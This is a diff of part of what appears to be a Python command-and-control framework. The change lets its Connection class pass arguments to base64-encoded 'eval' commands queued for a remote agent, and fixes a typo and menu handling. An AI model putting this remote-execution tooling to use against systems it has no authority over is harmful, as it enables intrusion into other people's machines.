@@ -30,24 +30,27 @@ class Connection():
             file_name = file_name[1]
             loader.discover_functions(file_name)
         for function in util.functions:
-            if function.format == self.stager_format:
+            if function.format == self.stager_format and function.name not in self.menu_options.keys():
                 self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description} (unloaded).', 'Connection Options', color.unloaded, True)
         self.update_options()
         return 0
 
     def execute(self, option):
-        option = option[0]
-        if option not in self.loaded_functions:
+        if option[0] not in self.loaded_functions:
             for function in util.functions:
-                if function.name == option:
+                if function.name == option[0]:
                     function_definiton = str(base64.b64encode(function.definiton.encode('utf-8')), 'utf-8')
-                    self.menu_options[option] = util.MenuOption(self.execute, f'{function.description}.', 'Connection Options', color.normal, True)
+                    self.menu_options[option[0]] = util.MenuOption(self.execute, f'{function.description}.', 'Connection Options', color.normal, True)
                     self.command_queue.append('{' + '"eval":' + f'"{function_definiton}"' + '}')
-                    self.loaded_functions.append(option)
+                    self.loaded_functions.append(option[0])
                     self.connection_cli.update_options(self.menu_options)
-        option = f'{option}()'
-        option = str(base64.b64encode(option.encode('utf-8')), 'utf-8')
-        self.command_queue.append('{' + '"eval":' + f'"{option}"' + '}')
+        function = f'{option[0]}()'
+        print(function)
+        function = str(base64.b64encode(function.encode('utf-8')), 'utf-8')
+        if len(option) > 1:
+            function = f'{option[0]}({option[1]})'
+            function = str(base64.b64encode(function.encode('utf-8')), 'utf-8')
+        self.command_queue.append('{' + '"eval":' + f'"{function}"' + '}')
         return 0
 
     def information(self):
@@ -59,7 +62,7 @@ class Connection():
 
     def interact(self):
         self.discover_options([''])
-        self.menu_options['discover'] = util.MenuOption(self.discover_options, 'Discovers new options from provided files within the extensions directory. (e.g., discover stdlib.jscript)', 'Conneciton Options', color.normal, True)
+        self.menu_options['discover'] = util.MenuOption(self.discover_options, 'Discovers new options from provided files within the extensions directory. (e.g., discover stdlib.jscript)', 'Connection Options', color.normal, True)
         self.menu_options['information'] = util.MenuOption(self.information, 'Displays gatherd system information.', 'Connection Options', color.normal, False)
         internet_addr = self.system_information['ip']
         self.connection_cli = cli.CommandLine(f'connection ({internet_addr}) :')
